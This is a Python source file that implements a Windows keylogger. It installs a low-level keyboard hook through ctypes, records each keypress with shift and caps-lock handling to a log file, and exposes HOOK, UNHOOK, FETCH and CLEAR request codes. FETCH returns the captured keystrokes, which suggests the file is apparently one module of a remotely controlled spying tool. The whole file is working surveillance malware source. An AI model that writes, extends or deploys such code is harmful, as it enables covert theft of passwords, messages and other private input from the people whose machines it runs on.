import ctypes
from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
from ctypes.wintypes import WPARAM, LPARAM, MSG, DWORD
import threading
from pathlib import Path
import os
import time

from handler_state import HandlerState
from vkcode import VK_CODE, VK_SHIFT, VK_CAPS_LOCK, NormalChar


user32 = windll.user32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

msg = MSG()

hook = None
stop = False

FILE_PATH = os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt")
file = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", DWORD),
                ("scanCode", DWORD),
                ("flags", DWORD),
                ("time", DWORD),
                ("dwExtraInfo", DWORD)]  

LLKP_decl = CFUNCTYPE(c_int, c_int, WPARAM, POINTER(KBDLLHOOKSTRUCT))

def LowLevelKeyboardProc(nCode, wParam, lParam):
    global file, stop

    assert file != None

    #Check for SHIFT or CAPSLOCK
    shifted = any([user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
    capslocked = user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000

    vkCode = lParam.contents.vkCode
    if wParam == WM_KEYDOWN:
        to_write = VK_CODE[vkCode]

        if type(to_write) == list:
            if shifted or capslocked:
                to_write = to_write[1]
            else:
                to_write = to_write[0]

        if not NormalChar(vkCode):
            to_write = ' ' + to_write + ' '

        file.write(to_write)

    if stop:
        user32.UnhookWindowsHookEx(hook)
        ctypes.windll.user32.PostQuitMessage(0)
    return user32.CallNextHookEx(hook, nCode, wParam, lParam)

def Record():
    global hook
    callback = LLKP_decl(LowLevelKeyboardProc)
    hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
    while user32.GetMessageA(ctypes.byref(msg),None, 0,0):
        pass

def RecordWrapper():
    a = threading.Thread(target = Record)
    return a

class KeystrokeHandler:
    def __init__(self, filepath):
        global file
        self.filepath = filepath
        self.thread = None
        self.hooked = False

        #Make sure file exists
        file = open(self.filepath, "w+")
        file.close()
        file = None
        pass

    def Execute(self, reqCode:str, data:str):
        global file
        try:
            extraData = ""
            if reqCode == "FETCH":
                assert self.hooked, "Hook has not been installed"

                file.close()
                file = open(self.filepath, "r")
                extraData = file.read()

                file.close()
                file = open(self.filepath, "a+")
            elif reqCode == "HOOK":
                self.Hook()
                pass
            elif reqCode == "UNHOOK":
                self.Unhook()
                pass
            elif reqCode == "CLEAR":
                file.close()
                file.open(self.filepath, "w")
                file.close()
                file.open(self.filepath, "a+")
            else:
                return HandlerState.INVALID, None

            return HandlerState.SUCCEEDED, extraData.encode("utf-8")
            pass
        except Exception as e:
            print(e)
            return HandlerState.FAILED, None

    def Hook(self):
        global stop, file

        #Open file in append mode
        assert not self.hooked, "Hook is already installed"

        file = open(self.filepath, "a+")
        self.thread = RecordWrapper()
        stop = False
        self.thread.start()
        self.hooked = True

    def Unhook(self):
        global stop, file
        
        assert self.hooked, "Hook is not installed"
        stop = True
        self.thread.join()
        
        if file:
            file.close()
            file = None
        self.hooked = False

    def __del(self):
        self.Unhook()
        pass

if __name__ == "__main__":
    a = KeystrokeHandler(FILE_PATH)
    a.Hook()
    time.sleep(2)
    a.Unhook()
